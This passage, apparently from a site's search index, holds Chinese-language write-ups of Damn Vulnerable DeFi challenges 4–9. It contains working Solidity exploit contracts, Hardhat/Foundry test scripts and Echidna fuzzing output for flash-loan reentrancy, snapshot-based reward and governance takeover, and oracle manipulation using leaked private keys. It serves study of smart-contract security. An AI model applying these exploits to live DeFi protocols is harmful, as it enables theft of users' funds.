with encoded parameters of contract method \u00b7 Issue #478 \u00b7 ethers-io/ethers.js","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/damn_vulnerable_defi/#4-side-entrance","text":"A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time. It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system. Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool. flashLoan() \u68c0\u67e5\u501f\u8d37\u524d\u540e SideEntranceLenderPool \u7684\u4f59\u989d\uff0c\u800c deposit \u80fd\u591f\u589e\u52a0\u5176\u4f59\u989d\u5e76\u4e3a msg.sender \u8bb0\u8d26 \u53ef\u5728 flashLoan() \u65f6 deposit() \uff0c\u7ed3\u675f\u540e withdraw() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // SideEntranceLenderPool.sol function deposit () external payable { unchecked { balances [ msg . sender ] += msg . value ; } emit Deposit ( msg . sender , msg . value ); } function withdraw () external { uint256 amount = balances [ msg . sender ]; delete balances [ msg . sender ]; emit Withdraw ( msg . sender , amount ); SafeTransferLib . safeTransferETH ( msg . sender , amount ); } function flashLoan ( uint256 amount ) external { uint256 balanceBefore = address ( this ). balance ; IFlashLoanEtherReceiver ( msg . sender ). execute { value : amount }(); if ( address ( this ). balance < balanceBefore ) revert RepayFailed (); }","title":"4. Side Entrance"},{"location":"wargames/damn_vulnerable_defi/#exploit_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./SideEntranceLenderPool.sol\" ; contract SideEntranceHacker is IFlashLoanEtherReceiver { SideEntranceLenderPool pool ; constructor ( address instance ) { pool = SideEntranceLenderPool ( instance ); } function exploit () external payable { pool . flashLoan ( 1000 ether ); pool . withdraw (); payable ( tx . origin ). transfer ( 1000 ether ); } function execute () external payable { pool . deposit { value : 1000 ether }(); } receive () external payable {} } 1 2 3 4 it ( 'Execution' , async function () { let hacker = await ( await ethers . getContractFactory ( 'SideEntranceHacker' , player )). deploy ( pool . address ); await hacker . exploit (); });","title":"Exploit"},{"location":"wargames/damn_vulnerable_defi/#using-echidna_2","text":"contracts/side-entrance/SideEntranceTest.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./SideEntranceLenderPool.sol\" ; contract PoolDeployer { // SideEntranceTest contract should not be the owner of the initial funds, // or it can remove the funds by calling withdraw() function deploy () external payable returns ( address ) { SideEntranceLenderPool pool = new SideEntranceLenderPool (); pool . deposit { value : 1000 ether }(); return address ( pool ); } } contract SideEntranceTest is IFlashLoanEtherReceiver { SideEntranceLenderPool pool ; bool canWithdraw ; bool canDeposit ; uint256 depositAmount ; constructor () payable { PoolDeployer deployer = new PoolDeployer (); pool = SideEntranceLenderPool ( deployer . deploy { value : 1000 ether }()); } receive () external payable {} function setWithdraw ( bool _enabled ) public { canWithdraw = _enabled ; } function setDeposit ( bool _enabled , uint256 _amount ) public { canDeposit = _enabled ; depositAmount = _amount ; } // IFlashLoanEtherReceiver.execute() // some manual work to guide Echidna function execute () external payable { if ( canWithdraw ) { pool . withdraw (); } if ( canDeposit ) { pool . deposit { value : depositAmount }(); } } function flashLoan ( uint256 _amount ) public { pool . flashLoan ( _amount ); } function testBalance () public view { assert ( address ( pool ). balance >= 1000 ether ); } } side-entrance.yml 1 2 3 4 5 6 7 testMode: assertion # to check sth as well as changing the state balanceContract: 1000000000000000000000 # 1000 ether deployer: \"0x10000\" psender: \"0x10000\" contractAddr: \"0x10000\" # only the SideEntranceTest contract is the sender sender: [\"0x10000\"] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ echidna . --contract SideEntranceTest --config side-entrance.yml ... execute () : passed! \ud83c\udf89 flashLoan ( uint256 ) : passed! \ud83c\udf89 setDeposit ( bool,uint256 ) : passed! \ud83c\udf89 setWithdraw ( bool ) : passed! \ud83c\udf89 testBalance () : failed!\ud83d\udca5 Call sequence: execute () Value: 0x8081 setDeposit ( true,32768 ) flashLoan ( 1 ) setDeposit ( false,0 ) setWithdraw ( true ) execute () testBalance () Event sequence: Panic ( 1 ) : Using assert. AssertionFailed ( .. ) : passed! \ud83c\udf89 Unique instructions: 1079 Unique codehashes: 2 Corpus size: 9 Seed: 4893652944378861842","title":"Using Echidna"},{"location":"wargames/damn_vulnerable_defi/#5-the-rewarder","text":"There\u2019s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don\u2019t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. By the way, rumours say a new pool has just launched. Isn\u2019t it offering flash loans of DVT tokens? rewardToken \u7684\u5206\u53d1\u53d6\u51b3\u4e8e\u6700\u540e\u4e00\u6b21\u5feb\u7167 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function distributeRewards () public returns ( uint256 rewards ) { if ( isNewRewardsRound ()) { _recordSnapshot (); } uint256 totalDeposits = accountingToken . totalSupplyAt ( lastSnapshotIdForRewards ); uint256 amountDeposited = accountingToken . balanceOfAt ( msg . sender , lastSnapshotIdForRewards ); if ( amountDeposited > 0 && totalDeposits > 0 ) { rewards = amountDeposited . mulDiv ( REWARDS , totalDeposits ); if ( rewards > 0 && ! _hasRetrievedReward ( msg . sender )) { rewardToken . mint ( msg . sender , rewards ); lastRewardTimestamps [ msg . sender ] = uint64 ( block . timestamp ); } } } \u6bcf \\(5\\) \u5929\u53ef\u4ee5\u5feb\u7167\u4e00\u6b21 1 2 3 4 5 6 7 8 9 10 11 12 13 uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days ; function _recordSnapshot () private { lastSnapshotIdForRewards = uint128 ( accountingToken . snapshot ()); lastRecordedSnapshotTimestamp = uint64 ( block . timestamp ); unchecked { ++ roundNumber ; } } function isNewRewardsRound () public view returns ( bool ) { return block . timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION ; } \u7531\u4e8e\u4e0d\u68c0\u67e5 deposit/withdraw \u7684\u65f6\u95f4\uff0c\u53ef\u5728 \\(5\\) \u5929\u540e\u501f\u52a9\u95ea\u7535\u8d37 deposit() \u521b\u5efa\u65b0\u7684\u5feb\u7167\u5e76\u83b7\u5f97 rewardToken \uff0c\u518d withdraw() \u5f52\u8fd8\u95ea\u7535\u8d37 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 function deposit ( uint256 amount ) external { if ( amount == 0 ) { revert InvalidDepositAmount (); } accountingToken . mint ( msg . sender , amount ); distributeRewards (); SafeTransferLib . safeTransferFrom ( liquidityToken , msg . sender , address ( this ), amount ); } function withdraw ( uint256 amount ) external { accountingToken . burn ( msg . sender , amount ); SafeTransferLib . safeTransfer ( liquidityToken , msg . sender , amount ); }","title":"5. The Rewarder"},{"location":"wargames/damn_vulnerable_defi/#exploit_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; import \"./FlashLoanerPool.sol\" ; import \"./TheRewarderPool.sol\" ; contract TheRewarderHacker { TheRewarderPool public immutable pool ; IERC20 public immutable dvt ; constructor ( address instance , address token ) { pool = TheRewarderPool ( instance ); dvt = IERC20 ( token ); } function exploit ( address lender , address token ) external { FlashLoanerPool ( lender ). flashLoan ( 1000000 ether ); IERC20 ( token ). transfer ( msg . sender , IERC20 ( token ). balanceOf ( address ( this ))); } function receiveFlashLoan ( uint256 amount ) external { dvt . approve ( address ( pool ), amount ); pool . deposit ( amount ); pool . withdraw ( amount ); dvt . transfer ( msg . sender , amount ); } } 1 2 3 4 5 6 7 8 it ( 'Execution' , async function () { await ethers . provider . send ( \"evm_increaseTime\" , [ 5 * 24 * 60 * 60 ]); // 5 days const TheRewarderHackerFactory = await ethers . getContractFactory ( 'TheRewarderHacker' , player ); const theRewarderHacker = await TheRewarderHackerFactory . deploy ( rewarderPool . address , liquidityToken . address ); await theRewarderHacker . exploit ( flashLoanPool . address , rewardToken . address ); });","title":"Exploit"},{"location":"wargames/damn_vulnerable_defi/#using-echidna_3","text":"\u56e0\u4e3a\u5408\u7ea6 TheRewarderPool \u6d89\u53ca\u5230 REWARDS_ROUND_MIN_DURATION \uff0c\u6240\u4ee5\u5728\u6d4b\u8bd5\u5408\u7ea6\u4e2d\u4f7f\u7528\u4e86 increaseTime() \uff0c\u5176\u5b83\u51fd\u6570\u903b\u8f91\u7c7b\u4f3c 4. Side Entrance \uff0c\u80fd\u591f Fuzzing \u51fa\u7ed3\u679c\uff0c\u4e0d\u8fc7 Hevm \u4e0d\u662f\u5fc5\u9700\u7684 uwu 1 2 3 function increaseTime () external { hevm . warp ( block . timestamp + 5 days ); } contracts/the-rewarder/TheRewarderTest.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./FlashLoanerPool.sol\" ; import \"./TheRewarderPool.sol\" ; interface IHevm { function warp ( uint256 ) external ; function prank ( address sender ) external ; } contract Deployer { uint256 constant TOKENS_IN_LENDER_POOl = 1000000 ether ; uint256 constant DEPOSIT_AMOUNT = 100 ether ; FlashLoanerPool public pool ; TheRewarderPool public rewarder ; constructor () { DamnValuableToken token = new DamnValuableToken (); pool = new FlashLoanerPool ( address ( token )); rewarder = new TheRewarderPool ( address ( token )); token . transfer ( address ( pool ), TOKENS_IN_LENDER_POOl ); for ( uint160 u = 0x20000 ; u < 0x60000 ; u += 0x10000 ) { token . transfer ( address ( u ), DEPOSIT_AMOUNT ); } } } /// @dev run with `echidna . --contract TheRewarderTest --config the-rewarder.yml` contract TheRewarderTest { FlashLoanerPool pool ; TheRewarderPool rewarder ; DamnValuableToken token ; RewardToken rewardToken ; IHevm hevm ; uint256 constant REWARDS_ROUND_MIN_DURATION = 5 days ; uint256 constant TOKENS_IN_LENDER_POOl = 1000000 ether ; uint256 constant DEPOSIT_AMOUNT = 100 ether ; bool canDeposit ; bool canWithdraw ; bool canDistribute ; constructor () { Deployer deployer = new Deployer (); pool = FlashLoanerPool ( deployer . pool ()); rewarder = TheRewarderPool ( deployer . rewarder ()); token = DamnValuableToken ( rewarder . liquidityToken ()); rewardToken = rewarder . rewardToken (); hevm = IHevm ( 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); // addr from docs // users deposit for ( uint160 u = 0x20000 ; u < 0x60000 ; u += 0x10000 ) { hevm . prank ( address ( u )); token . approve ( address ( rewarder ), DEPOSIT_AMOUNT ); hevm . prank ( address ( u )); rewarder . deposit ( DEPOSIT_AMOUNT ); } hevm . warp ( block . timestamp + REWARDS_ROUND_MIN_DURATION ); for ( uint160 u = 0x20000 ; u < 0x60000 ; u += 0x10000 ) { hevm . prank ( address ( u )); rewarder . distributeRewards (); } } function setDeposit ( bool _enabled ) public { canDeposit = _enabled ; } function setWithdraw ( bool _enabled ) public { canWithdraw = _enabled ; } function setDistribute ( bool _enabled ) public { canDistribute = _enabled ; } function receiveFlashLoan ( uint256 amount ) external { require ( msg . sender == address ( pool )); if ( canDeposit ) { token . approve ( address ( rewarder ), amount ); rewarder . deposit ( amount ); } if ( canWithdraw ) { rewarder . withdraw ( amount ); } if ( canDistribute ) { rewarder . distributeRewards (); } token . transfer ( address ( pool ), amount ); } function flashLoan () external { uint256 lastRewardsTimestamp = rewarder . lastRecordedSnapshotTimestamp (); require ( block . timestamp >= lastRewardsTimestamp + REWARDS_ROUND_MIN_DURATION , \"It's useless to call flashLoan if no rewards can be taken as ETH is precious.\" ); // Thus, no need to use hevm to warp time pool . flashLoan ( TOKENS_IN_LENDER_POOl ); } function testBalance () public view { assert ( rewardToken . balanceOf ( address ( this )) < rewarder . REWARDS () * 99 / 100 ); } } the-rewarder.yml 1 2 3 4 5 6 testMode : assertion deployer : \"0x10000\" psender : \"0x10000\" contractAddr : \"0x10000\" sender : [ \"0x10000\" ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ echidna . --contract TheRewarderTest --config the-rewarder.yml ... receiveFlashLoan ( uint256 ) : passed! \ud83c\udf89 setDistribute ( bool ) : passed! \ud83c\udf89 setDeposit ( bool ) : passed! \ud83c\udf89 flashLoan () : passed! \ud83c\udf89 setWithdraw ( bool ) : passed! \ud83c\udf89 testBalance () : failed!\ud83d\udca5 Call sequence: setDeposit ( true ) from: 0x0000000000000000000000000000000000010000 *wait* Time delay: 434239 seconds Block delay: 16633 setWithdraw ( true ) from: 0x0000000000000000000000000000000000010000 flashLoan () from: 0x0000000000000000000000000000000000010000 testBalance () from: 0x0000000000000000000000000000000000010000 Event sequence: Panic ( 1 ) : Using assert. AssertionFailed ( .. ) : passed! \ud83c\udf89 Unique instructions: 7102 Unique codehashes: 6 Corpus size: 3 Seed: 5526863836465074544","title":"Using Echidna"},{"location":"wargames/damn_vulnerable_defi/#_4","text":"ERC20Snapshot controlling the unit testing environment - hevm","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/damn_vulnerable_defi/#6-selfie","text":"A new cool lending pool has launched! It\u2019s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it. You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all. governance \u624d\u80fd\u8c03\u7528 emergencyExit() \u8f6c\u51fa pool \u4e2d\u7684\u8d44\u91d1 1 2 3 4 5 6 7 8 9 10 11 12 modifier onlyGovernance () { if ( msg . sender != address ( governance )) revert CallerNotGovernance (); _ ; } function emergencyExit ( address receiver ) external onlyGovernance { uint256 amount = token . balanceOf ( address ( this )); token . transfer ( receiver , amount ); emit FundsDrained ( receiver , amount ); } SimpleGovernance.executeAction() \u53ef\u4ee5\u6267\u884c\u81ea\u5b9a\u4e49\u8c03\u7528 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function executeAction ( uint256 actionId ) external payable returns ( bytes memory ) { if ( ! _canBeExecuted ( actionId )) revert CannotExecute ( actionId ); GovernanceAction storage actionToExecute = _actions [ actionId ]; actionToExecute . executedAt = uint64 ( block . timestamp ); emit ActionExecuted ( actionId , msg . sender ); ( bool success , bytes memory returndata ) = actionToExecute . target . call { value : actionToExecute . value }( actionToExecute . data ); if ( ! success ) { if ( returndata . length > 0 ) { assembly { revert ( add ( 0x20 , returndata ), mload ( returndata )) } } else { revert ActionFailed ( actionId ); } } return returndata ; } \u521b\u5efa\u65b0\u7684 action \u9700\u8981\u521b\u5efa\u8005\u83b7\u53d6\u8db3\u591f\u7684\u7968\u6570\uff0c\u7968\u6570\u5373\u521b\u5efa\u8005\u5728\u6700\u65b0\u5feb\u7167 governanceToken \u7684\u6301\u6709\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 function queueAction ( address target , uint128 value , bytes calldata data ) external returns ( uint256 actionId ) { if ( ! _hasEnoughVotes ( msg . sender )) revert NotEnoughVotes ( msg . sender ); if ( target == address ( this )) revert InvalidTarget (); if ( data . length > 0 && target . code . length == 0 ) revert TargetMustHaveCode (); actionId = _actionCounter ; _actions [ actionId ] = GovernanceAction ({ target : target , value : value , proposedAt : uint64 ( block . timestamp ), executedAt : 0 , data : data }); unchecked { _actionCounter ++ ; } emit ActionQueued ( actionId , msg . sender ); } function _hasEnoughVotes ( address who ) private view returns ( bool ) { uint256 balance = _governanceToken . getBalanceAtLastSnapshot ( who ); uint256 halfTotalSupply = _governanceToken . getTotalSupplyAtLastSnapshot () / 2 ; return balance > halfTotalSupply ; } \u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8fdb\u884c\u5feb\u7167 uwu \u90a3\u4e48\u5728\u95ea\u7535\u8d37\u65f6\u5feb\u7167\uff0c\u5373\u53ef\u83b7\u5f97\u5145\u8db3\u7684\u7968\u6570\uff0c\u5728\u4e0b\u4e00\u6b21\u5feb\u7167\u524d queueAction() \u5c31\u53ef\u4ee5\u5566w 1 2 3 4 function snapshot () public returns ( uint256 lastSnapshotId ) { lastSnapshotId = _snapshot (); _lastSnapshotId = lastSnapshotId ; }","title":"6. Selfie"},{"location":"wargames/damn_vulnerable_defi/#exploit_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol\" ; import \"../DamnValuableTokenSnapshot.sol\" ; import \"./ISimpleGovernance.sol\" ; import \"./SelfiePool.sol\" ; contract SelfieHack is IERC3156FlashBorrower { function exploit ( address instance , address pool ) external returns ( uint actionId ) { SelfiePool ( pool ). flashLoan ( this , address ( SelfiePool ( pool ). token ()), 1500000 ether , \"\" ); actionId = ISimpleGovernance ( instance ). queueAction ( pool , 0 , abi . encodeWithSignature ( \"emergencyExit(address)\" , msg . sender ) ); } function onFlashLoan ( address , address token , uint256 amount , uint256 , bytes calldata ) external returns ( bytes32 ) { DamnValuableTokenSnapshot ( token ). snapshot (); DamnValuableTokenSnapshot ( token ). approve ( msg . sender , amount ); return keccak256 ( \"ERC3156FlashBorrower.onFlashLoan\" ); } }","title":"Exploit"},{"location":"wargames/damn_vulnerable_defi/#hardhat_1","text":"1 2 3 4 5 6 7 8 it ( 'Execution' , async function () { const SelfieHack = await ( await ethers . getContractFactory ( 'SelfieHack' , player )). deploy (); // The return value of a non-pure non-view function is available only when the function is called and validated on-chain. await SelfieHack . exploit ( governance . address , pool . address ); await ethers . provider . send ( \"evm_increaseTime\" , [ 2 * 24 * 60 * 60 ]); await governance . executeAction ( await governance . getActionCounter () - 1 ); });","title":"Hardhat"},{"location":"wargames/damn_vulnerable_defi/#foundry_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 function exploit () internal override { // Sets attacker as msg.sender for all subsequent calls until stopPrank is called vm . startPrank ( attacker ); SelfieHack hack = new SelfieHack (); uint actionId = hack . exploit ( address ( governance ), address ( pool )); vm . stopPrank (); skip ( governance . getActionDelay ()); // 2 days governance . executeAction ( actionId ); }","title":"Foundry"},{"location":"wargames/damn_vulnerable_defi/#7-compromised","text":"While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here\u2019s a snippet: 1 2 3 4 5 6 7 8 9 HTTP/2 200 OK content-type: text/html content-language: en vary: Accept-Encoding server: cloudflare 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 A related on-chain exchange is selling (absurdly overpriced) collectibles called \u201cDVNFT\u201d, now at 999 ETH each. This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c. Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange. \u5bf9\u8fd4\u56de\u6570\u636e\u5148\u5341\u516d\u8fdb\u5236\u89e3\u7801\u518d Base64 \u89e3\u7801\u5f97\u5230\u5176\u4e2d\u4e24\u4e2a reporter \u7684\u79c1\u94a5 DVNFT \u7684\u4ef7\u683c\u53d6\u51b3\u4e8e reporters \u63d0\u4f9b\u4ef7\u683c\u7684\u4e2d\u4f4d\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function getMedianPrice ( string calldata symbol ) external view returns ( uint256 ) { return _computeMedianPrice ( symbol ); } function _computeMedianPrice ( string memory symbol ) private view returns ( uint256 ) { uint256 [] memory prices = getAllPricesForSymbol ( symbol ); LibSort . insertionSort ( prices ); if ( prices . length % 2 == 0 ) { uint256 leftPrice = prices [( prices . length / 2 ) - 1 ]; uint256 rightPrice = prices [ prices . length / 2 ]; return ( leftPrice + rightPrice ) / 2 ; } else { return prices [ prices . length / 2 ]; } } function getAllPricesForSymbol ( string memory symbol ) public view returns ( uint256 [] memory prices ) { uint256 numberOfSources = getRoleMemberCount ( TRUSTED_SOURCE_ROLE ); prices = new uint256 []( numberOfSources ); for ( uint256 i = 0 ; i < numberOfSources ;) { address source = getRoleMember ( TRUSTED_SOURCE_ROLE , i ); prices [ i ] = getPriceBySource ( symbol , source ); unchecked { ++ i ; } } } function getPriceBySource ( string memory symbol , address source ) public view returns ( uint256 ) { return _pricesBySource [ source ][ symbol ]; } \u5728\u6301\u6709\u4e24\u4e2a reporters \u79c1\u94a5\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5f88\u8f7b\u677e\u5730\u64cd\u63a7\u4ef7\u683c 1 2 3 function postPrice ( string calldata symbol , uint256 newPrice ) external onlyRole ( TRUSTED_SOURCE_ROLE ) { _setPrice ( msg . sender , symbol , newPrice ); } \u5148\u964d\u4f4e\u4ef7\u683c\u8d2d\u4e70 DVNFT\uff0c\u518d\u63d0\u9ad8\u4ef7\u683c\u5356\u51fa","title":"7. Compromised"},{"location":"wargames/damn_vulnerable_defi/#exploit_4","text":"","title":"Exploit"},{"location":"wargames/damn_vulnerable_defi/#hardhat_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 it ( 'Execution' , async function () { const resp = [ '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35' , '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34' , ]; let signers = []; for ( let i = 0 ; i < 2 ; i ++ ) { signers . push ( new ethers . Wallet ( Buffer . from ( Buffer . from ( resp [ i ]. split ( ' ' ). join ( '' ), 'hex' ). toString ( 'utf8' ), 'base64' ). toString ( 'utf8' ), ethers . provider )); await oracle . connect ( signers [ i ]). postPrice ( 'DVNFT' , 0 ); } // get tokenId from the event let tx = await exchange . connect ( player ). buyOne ({ value : 1 }); // (msg.value - price) will be send back let receipt = await tx . wait (); let id = receipt . events . filter ( ( x ) => { return x . event == \"TokenBought\" } )[ 0 ]. args . tokenId ; for ( let i = 0 ; i < 2 ; i ++ ) { oracle . connect ( signers [ i ]). postPrice ( 'DVNFT' , EXCHANGE_INITIAL_ETH_BALANCE ); } await nftToken . connect ( player ). approve ( exchange . address , id ); await exchange . connect ( player ). sellOne ( id ); });","title":"Hardhat"},{"location":"wargames/damn_vulnerable_defi/#foundry_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 function exploit () internal override { address [] memory users = new address []( 2 ); users [ 0 ] = vm . addr ( 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 ); users [ 1 ] = vm . addr ( 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 ); for ( uint8 i = 0 ; i < 2 ; i ++ ) { vm . prank ( users [ i ]); oracle . postPrice ( 'DVNFT' , 0 ); } vm . prank ( attacker ); uint id = exchange . buyOne { value : 1 }(); for ( uint8 i = 0 ; i < 2 ; i ++ ) { vm . prank ( users [ i ]); oracle . postPrice ( 'DVNFT' , EXCHANGE_INITIAL_ETH_BALANCE ); } vm . startPrank ( attacker ); nftToken . approve ( address ( exchange ), id ); exchange . sellOne ( id ); vm . stopPrank (); }","title":"Foundry"},{"location":"wargames/damn_vulnerable_defi/#8-puppet","text":"There\u2019s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity. There\u2019s a DVT market opened in an old Uniswap v1 exchange , currently with 10 ETH and 10 DVT in liquidity. Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance. \u4ece PuppetPool \u501f\u51fa token \u9700\u8981 deposit \u4e00\u5b9a\u6570\u91cf\u7684 ETH\uff0c\u7531 calculateDepositRequired() \u51b3\u5b9a\uff0c\u800c depositRequired \u7684\u8ba1\u7b97\u57fa\u4e8e UniswapV1Pair \u7684\u5b9e\u65f6\u4f59\u989d 1 2 3 4 5 6 7 8 function calculateDepositRequired ( uint256 amount ) public view returns ( uint256 ) { return amount * _computeOraclePrice () * DEPOSIT_FACTOR / 10 ** 18 ; } function _computeOraclePrice () private view returns ( uint256 ) { // calculates the price of the token in wei according to Uniswap pair return uniswapPair . balance * ( 10 ** 18 ) / token . balanceOf ( uniswapPair ); } Uniswap V1 \u4e0d\u652f\u6301 Flash swap\uff0c\u53ef\u4ee5\u5728 borrow \u524d swap \u6765\u964d\u4f4e uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair) \uff0c\u4ece\u800c\u4ee5\u4f4e\u4ef7\u501f\u51fa token player \u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u4ea4\u6613\uff0c\u800c DamnValuableToken \u652f\u6301 permit \uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u989d\u5916\u7684\u4ea4\u6613\u6765\u8c03\u7528 approve() 1 expect ( await ethers . provider . getTransactionCount ( player . address )). to . eq ( 1 );","title":"8. Puppet"},{"location":"wargames/damn_vulnerable_defi/#exploit_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 interface UniswapExchangeInterface { function tokenToEthSwapInput ( uint256 tokens_sold , uint256 min_eth , uint256 deadline ) external returns ( uint256 eth_bought ); } contract PuppetPoolHack { constructor ( address _pool , uint8 v , bytes32 r , bytes32 s , uint256 deadline ) payable { PuppetPool pool = PuppetPool ( _pool ); DamnValuableToken token = DamnValuableToken ( pool . token ()); token . permit ( msg . sender , address ( this ), 1000 ether , deadline , v , r , s ); token . transferFrom ( msg . sender , address ( this ), 1000 ether ); token . approve ( pool . uniswapPair (), 1000 ether ); UniswapExchangeInterface ( pool . uniswapPair ()). tokenToEthSwapInput ( 1000 ether , 1 , block . timestamp ); // since the contract is not deployed, ETH can be sent directly to the address pool . borrow { value : address ( this ). balance }( 100000 ether , msg . sender ); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 const { signERC2612Permit } = require ( 'eth-permit' ); it ( 'Execution' , async function () { const hackFactory = await ethers . getContractFactory ( 'PuppetPoolHack' , player ); let hackAddress = ethers . utils . getContractAddress ({ from : player . address , nonce : await player . getTransactionCount () }); let signature = await signERC2612Permit ( player , token . address , player . address , hackAddress , PLAYER_INITIAL_TOKEN_BALANCE ); await hackFactory . deploy ( lendingPool . address , signature . v , signature . r , signature . s , signature . deadline , { value : 10n * 10n ** 18n , gasLimit : 10 ** 6 } ); });","title":"Exploit"},{"location":"wargames/damn_vulnerable_defi/#references","text":"Exchange | Uniswap A Long Way To Go: On Gasless Tokens and ERC20-Permit","title":"References"},{"location":"wargames/damn_vulnerable_defi/#9-puppet-v2","text":"Now they\u2019re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough. You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. Save all funds from the pool, depositing them into the designated recovery account. \u501f\u51fa\u4ee3\u5e01\u6240\u9700 WETH \u6570\u91cf\u7684\u8ba1\u7b97\u7531\u57fa\u4e8e\u5b9e\u65f6\u4f59\u989d\u4fee\u6539\u4e3a\u57fa\u4e8e\u5b58\u50a8\u7684\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function calculateDepositOfWETHRequired ( uint256 tokenAmount ) public view returns ( uint256 ) { uint256 depositFactor = 3 ; return _getOracleQuote ( tokenAmount ). mul ( depositFactor ) / ( 1 ether ); } // Fetch the price from Uniswap v2 using the 